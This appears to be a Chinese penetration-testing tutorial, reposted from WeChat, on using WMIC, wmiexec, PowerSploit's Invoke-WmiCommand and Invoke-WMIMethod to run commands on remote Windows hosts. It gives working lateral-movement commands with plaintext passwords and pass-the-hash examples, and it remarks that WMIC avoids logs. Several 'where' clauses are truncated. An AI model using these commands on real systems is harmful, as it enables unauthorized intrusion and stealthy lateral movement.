> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0Nu8QQG99RNlB8HdlQgQsw)

**目录**

WMIC

WMIC 在渗透中常用命令

常用的 WMIC 命令

进程管理

账号管理

共享管理

服务管理

目录管理

计划任务

wmiexec.exe(admin$)

wmiexec.py

wmiexec.vbs

Invoke-WmiCommand.ps1

Invoke-WMIMethod

**使用以下的 wmic 工具远程连接目标机器执行命令，需要目标机器开启 admin$ 共享。**

WMIC
====

**WMIC** 是 Windows Management Instrumentation Command-line 的简称，它是一款命令行管理工具，提供了从命令行接口到批量命令脚本执行系统管理的支持，可以说是 Windows 平台下最有用的命令行工具。使用 WMIC，我们不但可以管理本地计算机，还可以管理统一局域网内的所有远程计算机（需要必要的权限），而被管理的计算机不必事先安装 WMIC。自 Windows98 开始，Windows 操作系统都支持 WMIC，WMIC 是一系列工具集组成的。

在用 WMIC 执行命令过程中，操作系统默认不会将 WMIC 的操作记录在日志中，因为在这个过程中不会产生日志。所以越来越多的攻击者由 psexec 转向 WMIC。

注：使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口。(135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤ 445 端⼝传回显)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIlV4BOczCzP7MLdCdEE9e6lFLczWV49ibfPl4EGMGnyhCwbCMWSSkr1Q/640?wx_fmt=png)

wmic.exe 位于 Windows 目录下，是一个命令行程序，WMIC 可以以两种模式运行：**交互模式和非交互模式**  

*   **交互模式**：如果你在命令提示符下或通过运行菜单只输入 WMIC，都将进入 WMIC 的交互模式，每当一个命令执行完毕后，系统还会返回到 WMIC 提示符下。交互模式通常在需要执行多个 WMIC 指令时使用，有时候还会对一些敏感的操作要求确认，例如删除操作，这样能最大限度地防止用户操作出现失误。
    
*   **非交互模式**：非交互模式是指将 WMIC 指令直接作为 WMIC 的参数放在 WMIC 后面，当指令执行完毕后再返回到普通的命令提示符下，而不是进入 WMIC 上下文环境中。WMIC 的非交互模式主要用于批处理或者其他一些脚本文件。
    

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEISaFz22xUGnNCLicO3PFkiaHGyG0aWyWmSrbbickbJkSu6CZibbBIvdWdKQ/640?wx_fmt=png)

在 WindowsXP 下，低权限用户是不能使用 WMIC 命令的。在 Win7 以及之后，低权限用户也可以使用 WMIC 命令，且不用更改任何设置。  

WMIC 在信息收集和后渗透测试阶段非常有用，可以调取查看目标机的进程、服务、用户、用户组、网络连接、硬盘信息、网络共享信息、已安装补丁、启动项、已安装的软件、操作系统的相关信息和时区等。

WMIC 在渗透中常用命令
-------------

使用 WMIC 远程执行命令，在远程系统中启动 WMIC 服务 (目标服务器需要开放 135 端口，WMIC 会以管理员权限在远程系统中执行命令)。如果目标服务器开启了防火墙，WMIC 将无法连接。另外由于 wmic 命令没有回显，需要使用 IPC$ 和 type 命令来读取信息。需要注意的是，如果 WMIC 执行的是恶意程序，将不会留下日志。

```
#以administrator用户,x123456./@密码连接192.168.10.131，并在机器上执行ipconfig命令，将结果写入c:\ip.txt文件中
wmic /node:192.168.10.131 /user:administrator /password:x123456./@ process call create "cmd.exe /c ipconfig > c:\ip.txt" 

#然后在建立IPC$连接读取c:\ip.txt文件的内容
```

常用的 WMIC 命令
-----------

### 进程管理

```
wmic process list brief    #列出所有进程，Full显示所有、Brief显示摘要、Instance显示实例、Status显示状态
wmic process get name,executablepath                           #获取所有进程名称以及可执行路径
wmic process where  get executablepath            #获取指定进程可执行路径
wmic process call create "C:\Program Files\Tencent\QQ\QQ.exe"   #创建新进程
wmic process call create "shutdown.exe -r -f -t 60"             #根据命令创建进程
wmic process where  delete                    #根据进程名称删除进程
wmic process where pid="123" delete                        #根据PID删除进程
```

### 账号管理

```
WMIC USERACCOUNT where " call rename newUserName  #更改当前用户名
```

### 共享管理

```
#建立共享
WMIC SHARE CALL Create "","test","3","TestShareName","","c:\test",0
(可使用 WMIC SHARE CALL Create /? 查看create后的参数类型)

#删除共享
WMIC SHARE where  call delete
WMIC SHARE where path='c:\test' delete
```

### 服务管理

```
#更改telnet服务启动类型[Auto|Disabled|Manual]
wmic SERVICE where 

#运行telnet服务
wmic SERVICE where  call startservice

#停止ICS服务
wmic SERVICE where  call stopservice

#删除test服务
wmic SERVICE where  call delete
```

### 目录管理

```
#列出c盘下名为test的目录
wmic FSDIR where "drive='c:' and file list
#删除c:\good文件夹
wmic fsdir "c:\test" call delete
#重命名c:\test文件夹为abc
wmic fsdir "c:\test" rename "c:\abc"
wmic fsdir where (name='c:\test') rename "c:\abc"
#复制文件夹
wmic fsdir where name='d:\test' call copy "c:\test"
#重命名文件
wmic datafile "c:\test.txt" call rename c:\abc.txt
```

### 计划任务

```
wmic job call create "notepad.exe",0,0,true,false,********154800.000000+480
wmic job call create "explorer.exe",0,0,1,0,********154600.000000+480
```

wmiexec.exe(admin$)
===================

```
wmiexec.exe administrator:root@192.168.10.20
wmiexec.exe administrator@192.168.10.20 -hashes d480ea9533c500d4aad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEI1XonkAESes2jT47L1Atmlkic2eAOoWdcWseib0Lbg4WpQgvObgFONXgw/640?wx_fmt=png)

wmiexec.py
==========

使⽤ wmiexec.py 脚本进⾏横向的前提是：\1. 目标主机开启了 135 端⼝（135 端⼝是 WMIC 默认的管理端⼝） \2. 目标主机开启了 445 端⼝（wimcexec 使⽤ 445 端⼝传回显）

准确说、如果要把输出结果写⽂件的话，需要⽤ smb 回传。如果写注册表，直接⽤ wmi 就能回来了，就不需要⾛ 445 了。sharpwmi 这个项⽬不依赖 139 和 445 端⼝，但是还需要依赖 135 端⼝。

wmiexec.py 脚本使用如下:

```
python2 wmiexec.py administrator:root@192.168.10.20
python2 wmiexec.py administrator@192.168.10.20 -hashes d480ea9533c500d4aad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIfmiaDhzE3CLNZc319licOWBEcfhKZ37nf5eF8ticuiabibg5wflM3HFiaTnQ/640?wx_fmt=png)

如果对方主机未开启 135 或 445，则报如下错：  

```
[-] Could not connect: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIU6QNf9NNw1OM4IMNsbkfDIulFPgic4OkSiaHeqSicO6RNkBfAXaDiabpzw/640?wx_fmt=png)

如果对方主机开启了 135 和 445，但是未开启 admin$ 共享，则一直处于连接状态。  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEISUsrqZkkdliapDYHReWND3MrlXGR2cg2ByE1kMVUrdo9LtgDVKicPC8A/640?wx_fmt=png)

wmiexec.vbs
===========

wmiexec.vbs 脚本通过 VBS 调用 wmic 来模拟 psexec 的功能。wmiexec.vbs 可以在远程系统中执行命令并进行回显，获得远程主机的半交互式的 shell。对于运行时间比较长的命令，例如 ping、systeminfo，需要添加 -wait 5000 或者更长时间的参数。在运行 nc 等不需要输入结果但需要一直运行的进程时，如果使用 -persist 参数，就不需要使用 taskkill 命令来远程结束进程了。

```
#获得一个半交互式的shell
cscript //nologo wmiexec.vbs /shell 192.168.10.20 administrator root
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIhYbdibuGHehAZRKe5GaqLFnLH3K7clibSwryveHjziaTtPDDPQJ1Q0Exw/640?wx_fmt=png)

Invoke-WmiCommand.ps1

该脚本在 PowerSploit 中的 CodeExecution 目录下，该脚本主要是通过 powershell 调用 WMIC 来远程执行命令，因此本质上还是利用 WMIC。

该脚本使用如下

```
#导入脚本
Import-Module .\Invoke-WmiCommand.ps1
#目标系统用户名
$User="xie\administrator"
#目标系统密码
$Password=ConvertTo-SecureString -String "x123456./@" -AsPlainText -Force
#将账号和密码整合起来，以便导入 Credential中
$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password
#在远程系统中运行 ipconfig 命令
$Remote=Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName 192.168.10.131
#将执行结果输出到屏幕上
$Remote.PayloadOutput
```

Invoke-WMIMethod
================

使用 powershell 自带的 Invoke-WMIMethod，可以在远程系统中执行命令和指定程序。

在 powershell 命令行环境执行如下命令，可以以非交互式的方式执行命令，但不会回显执行结果。

```
#目标系统用户名
$User="xie\administrator"
#目标系统密码
$Password=ConvertTo-SecureString -String "x123456./@" -AsPlainText -Force
#将账号和密码整合起来，以便导入 Credential中
$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password
#在远程系统中运行 calc.exe 命令
Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "192.168.10.131" -Credential $Cred
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIwlibbJNBrpMX0U3h0bOjWgbqXlMicIxmqJkrOO4xIWDv7nk3FYWzagqw/640?wx_fmt=png)

命令执行完成后，会在目标系统中运行 calc.exe 程序，返回的 PID 为 752

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEI8wsFO5jKYLHX4bUuozV9Zrm63UBElFCDNacqxS8IgeV59taINNctwQ/640?wx_fmt=png)

如果想跟我一起讨论，那快加入我的知识星球吧！ 

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cOYA2VPLdpWg6gMJHagTxXybayibUrw8O7lyCGVXibISZ0dChsd2MmRGg3YPL6r9gPIKb0eALicCszg/640?wx_fmt=png)